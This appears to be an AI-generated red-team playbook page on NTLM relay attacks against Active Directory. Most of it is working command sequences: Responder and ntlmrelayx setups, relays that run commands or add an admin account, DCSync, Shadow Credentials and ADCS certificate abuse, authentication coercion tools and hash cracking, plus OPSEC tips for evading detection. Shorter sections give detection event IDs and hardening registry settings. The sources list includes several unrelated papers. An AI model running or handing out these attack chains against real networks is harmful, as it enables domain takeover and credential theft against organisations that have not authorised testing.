---
title: "Attack #7 — NTLM Relay Attacks"
description: "NTLM relay is a man-in-the-middle attack that intercepts an NTLM authentication challenge-response in transit and forwards it to a different target before…"
category: active-directory
subcategory: "Credential Access"
tags: ["active-directory", "kerberos", "ntlm", "relay", "hashing"]
tools: ["Nmap", "NetExec", "Impacket", "Rubeus", "Hashcat"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-One/🔴 Attack #7 — NTLM Relay Attacks.md"
---
# 🔴 Attack #7 — NTLM Relay Attacks

***

## 📖 How It Works

NTLM relay is a **man-in-the-middle attack** that intercepts an NTLM authentication challenge-response in transit and **forwards it to a different target** before the original session completes. The attacker never needs to crack or possess the password — they simply sit between the authenticating client and a vulnerable target server, acting as a transparent proxy that relays the victim's credentials to gain access as them. The entire attack hinges on one critical misconfiguration: **SMB signing not being enforced** on the target, which means the relayed authentication cannot be cryptographically verified as originating from the correct source.

The NTLM three-way handshake is the mechanism being abused: the client sends a NEGOTIATE, the server responds with a CHALLENGE, and the client replies with an AUTHENTICATE response containing the Net-NTLMv2 hash. The attacker receives the victim's AUTHENTICATE response and immediately replays it against a target server of their choosing. Because Net-NTLMv2 is tied to the specific challenge issued by the server, you **cannot crack and reuse it for PtH** — but you absolutely can relay it live.

> ⚠️ **Windows 11 / Server 2025:** SMB signing required by default in Windows 11 24H2+, fundamentally altering the attack landscape. NTLM is on Microsoft's deprecation timeline with Kerberos as the replacement. Organizations in transition periods are most vulnerable — partial enforcement creates windows where relay remains viable. Check SMB config per target; never assume blanket hardening.

### NTLM Relay vs Pass-the-Hash — Critical Distinction

| Property | NTLM Relay | Pass-the-Hash |
|---|---|---|
| **What you capture** | Net-NTLMv2 challenge-response (live) | NT hash (from LSASS/SAM) |
| **Can be cracked?** | Yes (Hashcat -m 5600) but slow | N/A — already a hash |
| **Can be replayed for PtH?** | ❌ No | ✅ Yes |
| **Requires live session** | ✅ Must relay in real time | ❌ Offline |
| **Requires SMB signing disabled** | ✅ On target | ❌ |
| **Credential access level needed** | None (intercept only) | Local admin for LSASS dump |

### The Full Attack Flow

```
1. Identify targets with SMB signing not enforced (nmap / nxc scan)
2. Build relay target list (machines where victim has admin or useful access)
3. Start Responder in "listen only" mode (disable SMB/HTTP servers)
4. Start ntlmrelayx pointing at target list
5. Trigger NTLM authentication from victim:
   - LLMNR/NBT-NS/mDNS poisoning (passive — wait for victim to make typo)
   - Active coercion (PetitPotam, PrinterBug, mitm6)
6. Responder poisons the name resolution → victim authenticates to attacker
7. ntlmrelayx receives Net-NTLMv2 → relays to target server
8. Gain access as victim:
   - SMB shell / command execution
   - SAM/NTDS hash dump
   - LDAP — add new DA account, DCSync rights, Shadow Credentials
   - ADCS — request machine certificate → full domain compromise
```

### Cross-References — Related Techniques

**Attack #7, #8, #9 form a trilogy:**
- **#7** (NTLM Relay): The relay mechanism itself
- **#8** (LLMNR/NBT-NS/mDNS): Primary auth trigger for #7
- **#9** (mitm6): IPv6-based alternative trigger for #7

**Coercion references:**
- **#33** (ESC8): ADCS endpoint relay target
- **#41** (PetitPotam): Coerce DC auth into relay
- **#42** (PrinterBug): Coerce via Print Spooler
- **#77** (DFSCoerce): Alternate coercion method

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **SMB signing not enforced on target** | The single most critical requirement — signed SMB blocks relay to SMB |
| **NTLM enabled** | Must be allowed in domain; increasingly disabled in modern environments |
| **Network position** | Must be on same subnet / broadcast domain as victim to poison name resolution |
| **Relay-capable target** | SMB (445), LDAP (389/636), HTTP, MSSQL, SMTP, RPC — multiple protocols supported |
| **Victim triggers NTLM auth** | Via typo, coercion, or poisoned name resolution |

***

## 🛠️ Tools

| Tool | Platform | Role |
|---|---|---|
| **Responder** | Linux | Name resolution poisoner (LLMNR/NBT-NS/mDNS) — captures NTLM auth |
| **ntlmrelayx.py** (Impacket) | Linux | Core relay engine — supports SMB, LDAP, LDAPS, HTTP, MSSQL, RPC, ADCS |
| **mitm6** | Linux | IPv6 DNS spoofing — forces NTLM auth via rogue DHCPv6 server |
| **MultiRelay.py** | Linux | Alternative relay tool; simpler setup |
| **CrackMapExec / NetExec** | Linux | Enumerate SMB signing status; verify access post-relay |
| **Nmap** | Linux | `smb2-security-mode.nse` — identify signing enforcement status |
| **PetitPotam** | Linux/Win | Coerce DC authentication → relay to ADCS for certificate |
| **Hashcat** | Linux/Win | Crack captured Net-NTLMv2 hashes (mode 5600) if relay not viable |
| **Krbrelayx** | Linux | Kerberos relay — relays Kerberos tickets instead of NTLM (more modern) |
| **Coercer.py** | Linux | Multi-protocol coercion — centralized coercion orchestration |

***

## 💻 Full Commands

### 🔵 Step 0 — Identify Relay Targets (SMB Signing Status)

```bash
# ── Nmap — check SMB signing on specific host ─────────────────────────────────
nmap --script smb2-security-mode.nse -p 445 10.10.10.0/24

# Key output — "Message signing enabled but not required" = VULNERABLE
# "Message signing enabled and required" = NOT vulnerable to SMB relay

# ── NetExec — fast subnet-wide SMB signing check ─────────────────────────────
nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
# Automatically generates a file of IPs where signing is NOT enforced

# ── NetExec — manual check with verbose output ───────────────────────────────
nxc smb 10.10.10.0/24
# Look for 'signing:False' in output — those are your relay targets

# ── Check LDAP signing enforcement ────────────────────────────────────────────
nxc ldap 10.10.10.10 -u '' -p '' --ldap-signing
```

***

### 🔴 Core Setup — Responder + ntlmrelayx (SMB Relay)

```bash
# ── STEP 1: Edit Responder config — DISABLE SMB and HTTP servers ──────────────
# (Critical: if Responder responds to auth itself, you can't relay it)
nano /etc/responder/Responder.conf
# Set:  SMB = Off
#       HTTP = Off

# ── STEP 2: Start Responder to poison name resolution ─────────────────────────
sudo responder -I eth0 -rdwv
# -r  = enable answers for NetBIOS wredir suffix queries
# -d  = enable answers for NBNS domain suffix queries
# -w  = start WPAD rogue proxy server
# -v  = verbose

# ── STEP 3: Start ntlmrelayx pointing at relay target list ────────────────────

# Basic relay to list of targets — interactive SMB shell
ntlmrelayx.py -tf relay_targets.txt -smb2support -i
# -i = interactive shell mode (connect via nc localhost 11000)
# -smb2support = support SMBv2

# Relay and execute a command directly
ntlmrelayx.py -tf relay_targets.txt -smb2support -c "whoami > C:\pwned.txt"

# Relay and dump SAM hashes (no shell needed)
ntlmrelayx.py -tf relay_targets.txt -smb2support

# ── STEP 4: When relay succeeds, connect to interactive shell ─────────────────
nc 127.0.0.1 11000
# You now have an SMB shell as the relayed victim user
```

***

### 🔴 LDAP Relay — Domain Privilege Escalation (No SMB Signing Required on LDAP)

```bash
# ── Relay to LDAP — auto-escalate: create new DA user ─────────────────────────
ntlmrelayx.py -t ldap://10.10.10.10 -smb2support --escalate-user low_user

# ── Relay to LDAP — add DCSync rights to controlled account ──────────────────
ntlmrelayx.py -t ldap://DC01.corp.local -smb2support --escalate-user low_user
# ntlmrelayx automatically adds Replication-Get-Changes-All to low_user
# Then run DCSync:
secretsdump.py corp.local/low_user:'Password1'@DC01.corp.local

# ── Relay to LDAPS — dump full domain info (no signing required on LDAPS) ─────
ntlmrelayx.py -t ldaps://10.10.10.10 -smb2support --dump-adcs
ntlmrelayx.py -t ldaps://10.10.10.10 -smb2support --dump-laps

# ── Relay to LDAP — Shadow Credentials attack (add msDS-KeyCredentialLink) ────
ntlmrelayx.py -t ldap://10.10.10.10 --shadow-credentials \
  --shadow-target 'WORKSTATION01$' --no-validate-privs --no-dump --no-da
# After success: use the generated .pfx to get a TGT via PKINIT
# Workflow:
#   1. Relay relayed auth to LDAP with --shadow-credentials
#   2. ntlmrelayx generates a .pfx certificate file with new key credential
#   3. Extract private key from .pfx (openssl)
#   4. Use Rubeus/pyKerb to request TGT for target machine
#   5. Access as target machine account (e.g., DC, service account)

# ── Relay to LDAP — add new computer account (MAQ abuse) ─────────────────────
ntlmrelayx.py -t ldap://10.10.10.10 --add-computer EVILPC EvilPass123!
```

***

### 🔴 ADCS Relay — Full Domain Compromise (ESC8 Preview — Deep Dive in Attack #33)

```bash
# ── Relay to ADCS HTTP endpoint (certsrv) — request DC machine certificate ────
# First, identify ADCS server
nxc ldap 10.10.10.10 -u low_user -p 'Password1' -M adcs

# Start relay targeting ADCS web enrollment
ntlmrelayx.py -t http://ADCS01.corp.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template "DomainController"

# Coerce DC authentication to attacker machine (PetitPotam — Attack #41)
python3 PetitPotam.py -u low_user -p 'Password1' -d corp.local \
  <attacker_ip> <DC_IP>

# ntlmrelayx relays DC auth to ADCS → receives base64 certificate for DC$
# Use Rubeus to request TGT for the DC using the certificate
.\Rubeus.exe asktgt /user:DC01$ /certificate:<base64_cert> /ptt

# Now perform DCSync as DC01$ (has replication rights by default)
secretsdump.py -k -no-pass corp.local/'DC01$'@DC01.corp.local
# Game over — all domain hashes dumped
```

***

### 🔴 SMB Relay with Specific Target (Single High-Value Host)

```bash
# Target a specific machine instead of a list
ntlmrelayx.py -t smb://10.10.10.20 -smb2support -i

# Execute specific commands on target
ntlmrelayx.py -t smb://10.10.10.20 -smb2support \
  -c "net user hacker P@ssw0rd123 /add && net localgroup administrators hacker /add"

# Relay to MSSQL and execute commands via xp_cmdshell
ntlmrelayx.py -t mssql://10.10.10.30 -smb2support -q "exec xp_cmdshell 'whoami'"

# Relay to multiple different protocols simultaneously
ntlmrelayx.py -tf relay_targets.txt -smb2support \
  -t ldap://10.10.10.10 -t smb://10.10.10.20
```

***

### 🔴 Kerberos Relay (Krbrelayx) — Beyond NTLM

```bash
# ── Krbrelayx — relay Kerberos tickets instead of NTLM (more modern, stealthier)
# Setup: listen for Kerberos auth and relay to target service
python3 krbrelayx.py --krbsock 127.0.0.1:3333 -target smb://10.10.10.20 -spn cifs/10.10.10.20

# From another terminal, use a tool that initiates Kerberos auth toward krbrelayx
# Example: obtain a Kerberos TGS and relay it
# Advantages over NTLM relay:
#   - Bypasses NTLM restrictions on newer Windows versions
#   - Relayed ticket can be used for multiple targets
#   - Less logging (Kerberos tickets are expected in normal auth)

# ── Krbrelayx with specific TGS delegation ────────────────────────────────────
# Relay TGS to impersonate users
python3 krbrelayx.py -spn cifs/target.corp.local --krbsock 127.0.0.1:3333
```

***

### 🔴 Capturing & Cracking Net-NTLMv2 (Alternative if Relay Blocked)

```bash
# ── Responder captures Net-NTLMv2 hashes (when relay isn't viable) ────────────
# Enable SMB and HTTP in Responder.conf (opposite config from relay)
sudo responder -I eth0 -rdwv

# Hashes saved to: /usr/share/responder/logs/
ls /usr/share/responder/logs/

# ── Crack Net-NTLMv2 with Hashcat (mode 5600) ─────────────────────────────────
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Hash format looks like:
# Administrator::CORP:aabbccddeeff0011:Hash:ChallengeResponse
```

***

### 🔴 Triggering NTLM Authentication (Coercion Methods)

```bash
# ── Method 1: LLMNR/NBT-NS Poisoning (passive — wait for typo) ───────────────
# Just run Responder and wait — any victim who mistypes a hostname will
# trigger NTLM auth to your machine automatically

# ── Method 2: PetitPotam (coerce DC auth) ────────────────────────────────────
python3 PetitPotam.py -u low_user -p 'Password1' -d corp.local \
  <attacker_ip> <DC_IP>

# ── Method 3: PrinterBug / SpoolSample (coerce any host with Print Spooler) ──
python3 SpoolSample.py <target_ip> <attacker_ip>

# ── Method 4: Coercer.py (multi-protocol coercion toolkit) ────────────────────
python3 Coercer.py coerce -u low_user -p 'Password1' -d corp.local \
  -l <attacker_ip> -t <target_ip>
# Coercer supports multiple coercion methods:
#   - [+] PetitPotam (EFS RPC)
#   - [+] PrinterBug (Spooler RPC)
#   - [+] DFSCoerce (NetDFS RPC)
#   - [+] ShadowCoerce (VSS RPC)
#   - [+] WebClient coercion (via HTTP forcing)
# Automatically rotates through available methods

# Full syntax:
python3 Coercer.py coerce \
  -u low_user \
  -p 'Password1' \
  -d corp.local \
  -l 192.168.1.100 \
  -t 192.168.1.50 \
  --method all  # Try all coercion methods

# ── Method 5: mitm6 (IPv6 coercion — covered in Attack #9) ───────────────────
sudo mitm6 -d corp.local
ntlmrelayx.py -6 -t ldaps://DC01.corp.local -smb2support \
  --add-computer EVILPC EvilPass123!

# ── Method 6: DFSCoerce (Attack #77) — reliable RPC coercion ─────────────────
python3 DFSCoerce.py -d corp.local -u low_user -p 'Password1' \
  <attacker_ip> <target_ip>
```

***

## 🎯 OPSEC Tips

- **Always disable SMB/HTTP in Responder** when running ntlmrelayx — if Responder responds first, the relay chain breaks
- **Target LDAP over SMB** when possible — LDAP relay grants persistent privileges (DCSync rights, new accounts) rather than just a shell
- **ADCS relay is the most destructive** — a single relayed DC machine account auth → certificate → TGT → DCSync → full domain in under 60 seconds
- **Don't relay back to the victim's own machine** — Windows blocks loopback NTLM relay; you'll waste the auth attempt
- **Use `--no-da --no-acl`** flags in ntlmrelayx when you don't want noisy LDAP modifications and just want to dump info first
- **Rotate relay targets** — hitting the same target repeatedly increases detection probability
- **Check for LDAP channel binding** — LDAPS with channel binding enabled blocks LDAP relay even without signing
- **Krbrelayx for modern environments** — Organizations phasing out NTLM use Kerberos relay instead; blend in with legitimate auth
- **DFSCoerce as coercion fallback** — More reliable than PrinterBug on patched systems; less logged than PetitPotam
- **Time-to-execute**: LLMNR trigger → relay → DA access in 2-5 minutes if fully automated; ADCS relay slightly longer due to certificate generation

***

## 🧩 Troubleshooting

| Error | Cause | Fix |
|---|---|---|
| **STATUS_ACCESS_DENIED on relay** | Target rejects relayed auth (signing enabled or channel binding active) | Verify SMB signing status with `nxc smb <IP> \| grep signing`. Check for channel binding on LDAP with `nxc ldap <IP> --ldap-signing` |
| **LDAP signing required — relay fails** | LDAP signing enforced on domain controller | Relay to LDAPS (636) instead; if both fail, target is hardened — move to next target |
| **Channel binding failure** | LDAPS with EPA (Enhanced Protection) enabled | No LDAP relay possible; use SMB or ADCS targets instead; check `Get-ADOrganizationalUnit` for hardening level |
| **ntlmrelayx connection timeout** | Target doesn't respond or firewall blocks outbound relay attempt | Verify target is actually vulnerable (signing check), ensure network path is open, try `-vv` verbose flag to see handshake details |
| **Responder and ntlmrelayx not working together** | SMB/HTTP still enabled in Responder.conf | Edit `/etc/responder/Responder.conf`: SMB = Off, HTTP = Off; restart both tools |
| **"No suitable relay target found"** | All targets have SMB signing enabled | Expand scope: scan more subnets, or pivot to LDAP/ADCS relay instead of SMB-only |
| **Certificate not issued by ADCS during relay** | Web enrollment endpoint requires specific cert template permissions | Verify template access with `certutil -catemplates`; template may require DCSync rights; use `--template "*"` to auto-select |
| **ntlmrelayx receives auth but relay fails silently** | SMB relay receiving client auth but target rejects it (bad signing check/wrong user perms) | Run with `-vv` to see full relay handshake; verify user has admin on target; test with manual SMB shell first |

***

## 🗺️ MITRE ATT&CK

**Technique: T1557.001 — Adversary-in-the-Middle**

**Tactics:**
- **TA0006: Credential Access** — Capture NTLM hashes via man-in-the-middle
- **TA0008: Lateral Movement** — Use relayed credentials to pivot to target systems

**APT Groups Using NTLM Relay:**
- **APT28 (Fancy Bear)** — Documented NTLM relay in internal networks
- **APT29 (Cozy Bear)** — Active Directory lateral movement via relay techniques
- **APT41** — Relay attacks in post-compromise movement
- **Wizard Spider** — NTLM relay for domain escalation in ransomware campaigns
- **Scattered Spider** — Multi-stage relay attacks for persistence

**Related techniques:**
- T1040: Network Sniffing
- T1187: Forced Authentication
- T1550.001: Pass the Ticket (Kerberos relay equivalent)
- T1550.002: Pass the Hash (related credential reuse)

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4624** | Security Log | Logon Type 3 (network) — source IP doesn't match the account's known workstation |
| **4776** | Security Log | NTLM credential validation — source machine is unexpected for the authenticating user |
| **4768 / 4769** | Security Log | Kerberos tickets requested immediately after NTLM logon — attacker pivoting |
| **4741** | Security Log | New computer account created — ntlmrelayx `--add-computer` |
| **4728 / 4732** | Security Log | User added to privileged group — escalation via LDAP relay |
| **4662** | Security Log | Operation performed on AD object — DCSync rights being added via LDAP relay |
| **5145** | Security Log | Network share object checked — SMB relay access attempts |
| **LDAP query logs** | DC Diagnostic | Unusual LDAP modifications from a low-privilege account (adding ACEs, computer accounts) |

**Primary detection signature:** Event 4624 Type 3 logon where the **source workstation name doesn't match the account's registered computer** — this is the clearest relay indicator. On modern SIEMs, correlating a Responder poison event (DNS/LLMNR anomalies) with a subsequent 4624 from a new source IP is near-definitive.

### Sigma Rules (SigmaHQ)

```
Rule ID: detection_ntlm_relay_credential_access
Description: Detects multiple LLMNR/NBT-NS queries answered by same source IP
Event filter: Unusual responder patterns; multiple different hostnames answered by single IP
Status: MEDIUM severity

Rule ID: detection_ldap_relay_escalation
Description: Detects LDAP modifications from unexpected source during relay window
Event filter: msDS-KeyCredentialLink modifications, DCSync ACL adds from non-DC source
Status: HIGH severity
```

### EDR Detections

**Microsoft Defender for Identity:**
- Alert: "Suspected NTLM relay attack" — detects source IP responding to multiple authentication queries
- Alert: "Unusual LDAP query" — flags DCSync right additions from unexpected principals
- Alert: "Suspicious computer account creation" — MAQ abuse detection

**Falcon (CrowdStrike):**
- Network signature: "Lateral movement — SMB relay activity"
- Process: ntlmrelayx.py execution detected
- Behavioral: Privilege escalation via LDAP modification

### Hardening Commands

```powershell
# ── Enable SMB signing on all machines ───────────────────────────────────────
# GPO: Computer Configuration → Admin Templates → Network → SMB Server
# Set: "Digitally sign communications (if client agrees)" → Enabled AND "required"

# ── Registry-based (direct on host) ──────────────────────────────────────────
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v EnableSecuritySignature /t REG_DWORD /d 1 /f

# ── Enforce SMB Signing via PowerShell (immediate) ────────────────────────────
$path = "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
Set-ItemProperty -Path $path -Name RequireSecuritySignature -Value 1 -Force
Set-ItemProperty -Path $path -Name EnableSecuritySignature -Value 1 -Force
Restart-Service LanmanServer -Force

# ── Enable LDAP signing (block LDAP relay) ──────────────────────────────────
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v LDAPServerIntegrity /t REG_DWORD /d 2 /f
# Value: 0 = None, 1 = Negotiate signing, 2 = Required

# ── Enable LDAP channel binding (block LDAPS relay even without signing) ───────
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v "CBT Extended Protection" /t REG_DWORD /d 1 /f

# ── Disable NTLM entirely (most aggressive) ──────────────────────────────────
# GPO: Computer Configuration → Admin Templates → Network → Restrict NTLM
# Set: "Restrict NTLM: Outgoing NTLM traffic from all computers" → Deny All

reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RestrictNTLMInDomain /t REG_DWORD /d 7 /f
# 7 = Deny for all, 4 = Deny for servers only

# ── Configure EPA (Extended Protection for Authentication) ────────────────────
# GPO: Computer Configuration → Admin Templates → Network → NTLM →
# Set: "Extended Protection for NTLM Authentication Service" → Required

reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" /v ExtendedProtectionLevel /t REG_DWORD /d 2 /f
# 0 = Off, 1 = Allow (compatible), 2 = Required (most secure)

# ── Verify all settings applied ──────────────────────────────────────────────
.\Verify-SMBSigning.ps1  # Custom script to audit all machines
```

***

## 🔗 Attack Chain Context

```
[NTLM Relay] ──→ Multiple Escalation Paths Depending on Target Protocol
         │
         ├──→ SMB Relay → shell/code execution as victim user → LSASS dump → PtH
         ├──→ LDAP Relay → add DCSync ACE to own account → dump all hashes
         ├──→ LDAP Relay → Shadow Credentials → PKINIT TGT → DA access
         ├──→ ADCS Relay (ESC8) → DC machine cert → TGT → DCSync → game over
         ├──→ MSSQL Relay → xp_cmdshell → code execution as SQL service account
         ├──→ Kerberos Relay (Krbrelayx) → TGS relay → multi-target lateral move
         └──→ Net-NTLMv2 capture → Hashcat crack → valid plaintext credentials
```

### Protocol Relay Compatibility Matrix

| Relay Target | SMB Signing Needed? | LDAP Signing Needed? | Channel Binding | Privilege Impact |
|---|---|---|---|---|
| **SMB** | Must be disabled | N/A | N/A | Shell/code exec as victim |
| **LDAP** | N/A | Must be disabled | Must be disabled | ACL modification, user creation |
| **LDAPS** | N/A | N/A | Must be disabled | Same as LDAP but encrypted |
| **ADCS HTTP** | N/A | N/A | N/A | Certificate → TGT → DCSync |
| **MSSQL** | N/A | N/A | N/A | xp_cmdshell code execution |

***

> ✅ **Attack #7 — NTLM Relay complete.** Tell me to move on when you're ready for **Attack #8 — LLMNR / NBT-NS / mDNS Poisoning**.

Sources
 NTLM relay | The Hacker Recipes https://www.thehacker.recipes/ad/movement/ntlm/relay
 CQURE Hacks #68: NTLM Relay Attacks Explained and Why It's ... https://cqureacademy.com/blog/ntlm-relay-attacks-and-why-to-phase-out/
 SMB Relay Attacks and Active Directory - TCM Security https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/
 Understanding NTLM Authentication and NTLM Relay Attacks https://www.vaadata.com/blog/understanding-ntlm-authentication-and-ntlm-relay-attacks/
 NTLM Relay Attacks in Practice: Exploiting Missing SMB Signing https://cqureacademy.com/blog/ntlm-relay-attacks-exploiting-missing-smb-signing/
 Network Relaying Abuse in a Windows Domain https://www.lrqa.com/en/cyber-labs/network-relaying-abuse-windows-domain/
 NTLM Relay Attacks Targeting Microsoft Domain Controllers https://cloudsecurityalliance.org/blog/2022/08/11/detecting-and-mitigating-ntlm-relay-attacks-targeting-microsoft-domain-controllers
 An Open-Source Approach to Detect Pass-the-Hash Attack in Active Directory Using Wazuh and Sysmon https://link.springer.com/10.1134/S0361768825700483
 Penetration Testing and Exploitation of Active Directory Configuration Vulnerabilities https://ieeexplore.ieee.org/document/10895772/
 Bridging Bridging Gaps in Active Directory Security: Threat Landscape, Limitations, and Future-Proof Solutions https://ijeci.lgu.edu.pk/index.php/ijeci/article/view/3
 AUTHENTICATION METHODS IN ACTIVE DIRECTORY AND THEIR IMPACT ON CORPORATE ENVIRONMENT SECURITY https://csecurity.kubg.edu.ua/index.php/journal/article/view/807
 Penetration Testing Platforms for Active Directory Network Environment https://www.ijltemas.in/DigitalLibrary/Vol.13Issue4/06-10.pdf
 Cyber Kill Chain Framework Approach to Map Potential Attack Vectors on Windows-based OS https://ijecbe.ui.ac.id/go/article/view/107
 Kerberos under Attack https://www.semanticscholar.org/paper/3af20812633e95bb2062ed94528c116769cbd2aa
 Privilege Escalation Exploiting MS Exchange https://www.semanticscholar.org/paper/01175ce9630f49d7434518c30f8a0468213090b2
 Honey Onions: Exposing Snooping Tor HSDir Relays https://www.semanticscholar.org/paper/3ff1793ac5036dbc68b669ac43d4b0c235ea0745
 Hacking Exposed Windows 2000: Network Security Secrets and Solutions https://www.semanticscholar.org/paper/e7b97bd62a710d9dde5e45be9b53c356fd309d52
 Detecting Forged Kerberos Tickets in an Active Directory Environment https://arxiv.org/ftp/arxiv/papers/2301/2301.00044.pdf
 Preventing Time Synchronization in NTP's Broadcast Mode https://arxiv.org/pdf/2005.01783.pdf
 Securing Wi-Fi 6 Connection Establishment Against Relay and Spoofing Threats http://arxiv.org/pdf/2501.01517.pdf
 HADES: Detecting Active Directory Attacks via Whole Network Provenance Analytics http://arxiv.org/pdf/2407.18858.pdf
 Optimizing Cyber Response Time on Temporal Active Directory Networks Using Decoys http://arxiv.org/pdf/2403.18162.pdf
 Applying recent secure element relay attack scenarios to the real world: Google Wallet Relay Attack http://arxiv.org/pdf/1209.0875.pdf
 The Impact of DNS Insecurity on Time https://arxiv.org/pdf/2010.09338.pdf
 Spoiled Onions: Exposing Malicious Tor Exit Relays http://arxiv.org/pdf/1401.4917.pdf
 KB5005413: Mitigating NTLM Relay Attacks on Active Directory ... https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429
 Windows 11 will require SMB signing to prevent NTLM relay attacks https://neosolutions.ca/windows-11-will-require-smb-signing-to-prevent-ntlm-relay-attacks/
 Unpatched AD CS Vulnerability Exploitation with NTLMRelayx https://www.youtube.com/watch?v=8M9kbWE1wyM
 Practical SMB Relay Attack - YouTube https://www.youtube.com/watch?v=9i5rBOkkjC0
 Exploring Uncommon NTLM Relay Attack Techniques https://www.guidepointsecurity.com/blog/beyond-the-basics-exploring-uncommon-ntlm-relay-attack-techniques/
 CQURE Hacks #68: NTLM Relay Attacks Explained — and Why It's Time to Phase Out NTLM https://www.youtube.com/watch?v=7py2n9gwzko
 SMB Signing and NTLM Relay Attack Explained with Practical Demo https://www.youtube.com/watch?v=INRd9XAHaWU
 IPv6 Attack with MITM6 & NTLMRELAYX https://www.youtube.com/watch?v=AmcWc2CjXx8
